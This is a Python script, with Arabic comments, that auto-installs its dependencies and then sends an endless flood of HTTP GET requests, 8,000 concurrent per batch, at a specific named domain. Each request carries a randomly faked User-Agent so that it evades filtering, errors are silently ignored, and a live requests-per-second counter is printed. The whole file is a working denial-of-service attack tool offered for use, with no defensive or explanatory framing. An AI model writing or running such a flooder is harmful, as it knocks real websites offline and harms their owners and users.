import subprocess
import sys

# قائمة المكتبات المطلوبة
REQUIRED_LIBRARIES = [
    "aiohttp",        # لإرسال الطلبات بشكل غير متزامن
    "asyncio",        # للبرمجة غير المتزامنة
    "psutil",         # لمراقبة استخدام الموارد (اختياري)
    "fake_useragent"  # لتوليد وكلاء مستخدمين مزيفين
]

# وظيفة لتثبيت المكتبات
def install_libraries():
    for library in REQUIRED_LIBRARIES:
        try:
            __import__(library)  # محاولة استيراد المكتبة
        except ImportError:
            print(f"Installing {library}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", library])

# تثبيت المكتبات قبل استدعائها
install_libraries()

# استدعاء المكتبات
import aiohttp
import asyncio
import time
import psutil
from fake_useragent import UserAgent  # استيراد UserAgent من fake_useragent

# النطاق (domain) الهدف
URL = "http://slawat.net"

# عدد الطلبات المتزامنة
CONCURRENT_REQUESTS = 8000

# متغيرات لتتبع عدد الطلبات والأداء
request_count = 0
start_time = time.time()

# إنشاء كائن UserAgent لتوليد وكلاء مستخدمين عشوائيين
ua = UserAgent()

# وظيفة لإرسال طلبات HTTP مع وكيل مستخدم عشوائي
async def send_http_request(session):
    global request_count
    headers = {'User-Agent': ua.random}  # اختيار وكيل مستخدم عشوائي لكل طلب
    try:
        async with session.get(URL, headers=headers) as response:
            request_count += 1
    except Exception as e:
        pass  # تجاهل الأخطاء

# تشغيل الطلبات بشكل متزامن
async def main():
    async with aiohttp.ClientSession() as session:
        while True:
            tasks = [send_http_request(session) for _ in range(CONCURRENT_REQUESTS)]
            await asyncio.gather(*tasks)

# عرض الإحصائيات في سطر واحد يتم تحديثه
async def print_stats():
    while True:
        await asyncio.sleep(1)
        elapsed_time = time.time() - start_time
        requests_per_second = request_count / elapsed_time
        print(f"\r📊 Current Speed: {requests_per_second:.2f} req/s | Total Requests: {request_count}", end="", flush=True)

# تشغيل الوظائف
async def run():
    await asyncio.gather(main(), print_stats())

# بدء البرنامج
asyncio.run(run())
